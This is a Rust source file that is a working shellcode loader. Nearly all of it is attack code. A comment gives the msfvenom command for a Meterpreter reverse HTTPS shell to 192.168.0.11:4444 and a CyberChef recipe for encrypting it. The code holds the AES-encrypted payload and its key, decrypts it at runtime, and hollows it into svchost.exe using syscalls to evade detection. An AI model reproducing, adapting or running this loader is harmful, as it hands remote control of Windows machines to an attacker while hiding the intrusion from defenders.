use libaes::Cipher;
use process_injection::*;

fn main() {
    let key: [u8; 16] = [
        0x4f, 0x20, 0x08, 0xd7, 0x2f, 0x29, 0xb5, 0xec, 0x5c, 0xc3, 0xbf, 0xef, 0x6f, 0x99, 0xbb,
        0xbd,
    ];
    let iv: [u8; 16] = [
        0x00, 0xc9, 0x13, 0x92, 0xb6, 0x5d, 0xaa, 0xd1, 0xc9, 0xb9, 0x68, 0x2b, 0x0f, 0x7c, 0x58,
        0xd8,
    ];

    // generate payload with msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.11 LPORT=4444 -f rust
    // encrypt with https://gchq.github.io/CyberChef/#recipe=Remove_whitespace(true,true,true,true,true,false)From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'4f%2020%2008%20d7%202f%2029%20b5%20ec%205c%20c3%20bf%20ef%206f%2099%20bb%20bd'%7D,%7B'option':'Hex','string':'00%20c9%2013%2092%20b6%205d%20aa%20d1%20c9%20b9%2068%202b%200f%207c%2058%20d8'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Hex('0x%20with%20comma',0)
    let shellcode_encrypted: [u8; 512] = [
        0xeb, 0x68, 0x1e, 0xbc, 0xce, 0x0d, 0x20, 0xb6, 0x68, 0xec, 0x94, 0x00, 0x32, 0xad, 0xbb,
        0x47, 0xae, 0xa0, 0xea, 0x7c, 0xd3, 0x76, 0xf9, 0x81, 0x29, 0x47, 0xca, 0x64, 0x84, 0x1d,
        0x20, 0x7a, 0x9f, 0x29, 0x36, 0x0d, 0x1a, 0xc0, 0x6f, 0x12, 0x2d, 0x00, 0x82, 0xec, 0x1c,
        0x20, 0x19, 0x7a, 0x6b, 0x21, 0x33, 0xca, 0xa0, 0x42, 0x4e, 0x1f, 0x12, 0xfe, 0x69, 0x77,
        0x44, 0xe2, 0x41, 0x57, 0x18, 0x64, 0xaf, 0x69, 0x83, 0x94, 0xb6, 0xa9, 0x65, 0x97, 0x51,
        0x04, 0x71, 0xfc, 0x57, 0xd3, 0xc2, 0x9b, 0x34, 0xf7, 0x7b, 0x34, 0x4d, 0xf4, 0xc4, 0x38,
        0x41, 0xdf, 0xe6, 0x02, 0x19, 0xa3, 0x6e, 0x32, 0x1c, 0xc3, 0xe3, 0x84, 0xad, 0xbf, 0x42,
        0x93, 0x2f, 0xe7, 0x91, 0xfb, 0x67, 0x12, 0x42, 0xca, 0xf2, 0x54, 0x88, 0xde, 0x5c, 0xbf,
        0x74, 0xfd, 0xdc, 0xda, 0x8c, 0x5b, 0xa5, 0x56, 0x41, 0x10, 0x36, 0xa9, 0xff, 0x1d, 0xd8,
        0x9a, 0x49, 0x07, 0x4f, 0x41, 0x93, 0x57, 0x97, 0x19, 0x65, 0x81, 0xa1, 0x31, 0x20, 0x2e,
        0x31, 0x81, 0x4e, 0x55, 0x3a, 0x3d, 0x5f, 0x16, 0x96, 0x00, 0x55, 0xe9, 0xc8, 0x43, 0x0d,
        0xc6, 0xfb, 0x2a, 0x45, 0xc7, 0x50, 0x73, 0x06, 0xe8, 0xf3, 0xaa, 0xb7, 0x53, 0xde, 0xbd,
        0x18, 0x41, 0x0b, 0xe6, 0xf2, 0x14, 0x97, 0x39, 0x6b, 0xbc, 0x49, 0x13, 0xa1, 0x68, 0xa5,
        0xa6, 0x1e, 0x95, 0xe2, 0x66, 0x76, 0xc5, 0xfb, 0x1b, 0x19, 0x9e, 0x9e, 0xd6, 0xc3, 0x06,
        0x24, 0x7e, 0x93, 0xff, 0xb0, 0xb9, 0x95, 0x9c, 0x38, 0x4b, 0x5a, 0x97, 0xb4, 0x81, 0x3f,
        0x8c, 0x7c, 0x15, 0xb1, 0x83, 0x49, 0xd7, 0xb3, 0x97, 0xb9, 0x39, 0x89, 0xd8, 0x3d, 0xed,
        0x41, 0x01, 0xda, 0xb8, 0x9a, 0xf5, 0x0a, 0x61, 0x9f, 0x38, 0xa3, 0x1a, 0xc5, 0x2c, 0xa3,
        0x2c, 0x7f, 0xdb, 0x2b, 0x97, 0xd8, 0xf5, 0x24, 0x4b, 0x61, 0x5c, 0x30, 0x31, 0xf1, 0xc1,
        0x6e, 0x67, 0x90, 0x03, 0x79, 0x1d, 0x14, 0x03, 0x55, 0xd7, 0xb5, 0xa0, 0xe3, 0xe2, 0xed,
        0x52, 0xb7, 0x76, 0x02, 0xc8, 0xa9, 0xc8, 0x2f, 0x16, 0x6c, 0x6d, 0x8a, 0x3f, 0xb8, 0x90,
        0x0f, 0x9d, 0xc6, 0xd6, 0x8e, 0xfa, 0xd4, 0x51, 0x45, 0xa6, 0x55, 0x07, 0xb1, 0x64, 0x0e,
        0x21, 0xf7, 0x20, 0x03, 0xdf, 0x33, 0x61, 0x8f, 0x46, 0xc8, 0x28, 0x3c, 0xec, 0xb5, 0xfe,
        0x25, 0x73, 0x38, 0x17, 0x46, 0xa6, 0xb7, 0xf3, 0xb4, 0x0e, 0x7e, 0xe1, 0x5a, 0xd1, 0x6d,
        0x56, 0x44, 0x23, 0xd8, 0x79, 0x0b, 0xec, 0xd8, 0x17, 0x71, 0xd6, 0x6a, 0x7a, 0xf6, 0x1a,
        0x96, 0xfb, 0xf6, 0x6f, 0xa8, 0x04, 0xb7, 0x45, 0x84, 0x91, 0xfa, 0xfb, 0x85, 0xd8, 0x09,
        0x95, 0xde, 0xe2, 0xda, 0x01, 0x6a, 0xab, 0xf4, 0x82, 0x9a, 0x06, 0x28, 0x15, 0x07, 0x83,
        0x8a, 0x14, 0x5c, 0x78, 0x74, 0x57, 0xfe, 0x5e, 0x33, 0x75, 0x26, 0x61, 0xc5, 0x4f, 0x7e,
        0x6f, 0x7a, 0x9a, 0x2e, 0x66, 0x74, 0x35, 0xcc, 0x06, 0xdc, 0x6d, 0xef, 0x4b, 0xc2, 0x3d,
        0xea, 0xbb, 0x49, 0x74, 0x22, 0x2b, 0xdd, 0xfe, 0xfc, 0xfb, 0x93, 0xa0, 0xb0, 0x6e, 0x6d,
        0x9a, 0x60, 0x56, 0xe3, 0x0a, 0x25, 0x3c, 0x32, 0x50, 0x95, 0x0a, 0xc2, 0x1b, 0xe2, 0x76,
        0x6b, 0xe4, 0x2e, 0x05, 0x1c, 0x06, 0x40, 0x92, 0x08, 0x12, 0x72, 0x7a, 0x69, 0x4c, 0x12,
        0xe7, 0x76, 0x29, 0xe0, 0x40, 0x7d, 0x38, 0xb0, 0x61, 0xe6, 0x64, 0x6b, 0x82, 0xbe, 0xe5,
        0x21, 0xbf, 0xac, 0x1d, 0x6d, 0xea, 0xa6, 0x49, 0xf0, 0xd9, 0xde, 0x13, 0x82, 0xc5, 0x77,
        0xae, 0x8c, 0x2c, 0xa6, 0x4a, 0xef, 0xc7, 0x97, 0x16, 0xae, 0x5f, 0x35, 0x6b, 0x8d, 0x6b,
        0x46, 0x88,
    ];

    let cipher = Cipher::new_128(&key);
    let buf = cipher.cbc_decrypt(&iv, &shellcode_encrypted[..]);

    let exe_path = "C:\\Windows\\System32\\svchost.exe".to_string();
    match inject_hollow_syscalls(exe_path, buf) {
        Ok(()) => println!("Process has been injected."),
        Err(e) => println!("Error during injection: {:?}", e),
    }
}